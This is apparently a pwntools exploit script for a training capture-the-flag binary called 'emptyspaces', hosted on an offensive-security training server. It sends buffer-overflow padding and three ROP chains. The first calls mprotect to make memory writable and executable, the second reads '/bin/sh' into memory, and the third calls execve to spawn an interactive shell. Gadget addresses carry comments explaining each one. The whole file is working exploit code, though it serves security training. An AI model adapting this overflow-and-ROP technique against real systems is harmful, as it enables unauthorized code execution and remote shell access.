from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./emptyspaces")
    gdb.attach(r, """
            # after read
            #b *0x804841b 
            #b *0x00400c02
            # before read
            b *0x00400bfd
            # before empty
            #b *0x00400c09
            c
                """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 4006)

syscall = 0x000000000044a595  # a syscall() call in the program text (ghidra)
main = 0x00400b95  # (ghidra)
# where we will put the string /bin/sh (it is in the program text, which won't be randomized)
binsh = 0x004a9af0  # (using x/40gx on gdb)

# gadgets (using ROPgadget --binary emptyspaces)
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410133
pop_rdx = 0x000000000044bd36
pop_rdx_rsi = 0x000000000044bd59
pop_rax = 0x00000000004155a4
pop_rdi_syscall = 0x000000000044400d
syscall_ret = 0x0000000000474dc5

input("Press enter to start")
chain = b"A"*72  # padding
chain += p64(pop_rdx)
# is the number related to the permission of the memory area (7 obtained as 4 (read) + 2 (write) + 1 (execute))
chain += p64(7)
chain += p64(pop_rax)
# mprotect is a syscall with number 10 that means change the permission of a memory area
chain += p64(0x0a)
chain += p64(pop_rdi)
chain += p64(0x400000)  # address of the memory area to change
chain += p64(syscall_ret)  # syscall ret
chain += p64(main)  # return to main
r.sendline(chain)


input("Write /bin/sh")
chain = b"A"*72  # padding
chain += p64(pop_rsi)
chain += p64(binsh)  # address of the string /bin/sh
chain += p64(pop_rax)
chain += p64(0x0)  # rax = 0 (read)
chain += p64(pop_rdi)
chain += p64(0)  # rdi = 0
chain += p64(syscall_ret)  # syscall ret
chain += p64(main)  # return to main
r.sendline(chain)

sleep(1)
r.sendline(b"/bin/sh\x00")

input("Get the shell")
chain = b"A"*72
chain += p64(pop_rdx_rsi)
chain += p64(0)  # rdx = 0
chain += p64(0)  # rsi = 0
chain += p64(pop_rax)
chain += p64(0x3b)  # rax = 0x3b (execve)
chain += p64(pop_rdi_syscall)
chain += p64(binsh)  # rdi = address of /bin/sh
r.sendline(chain)  # send the chain

r.interactive()
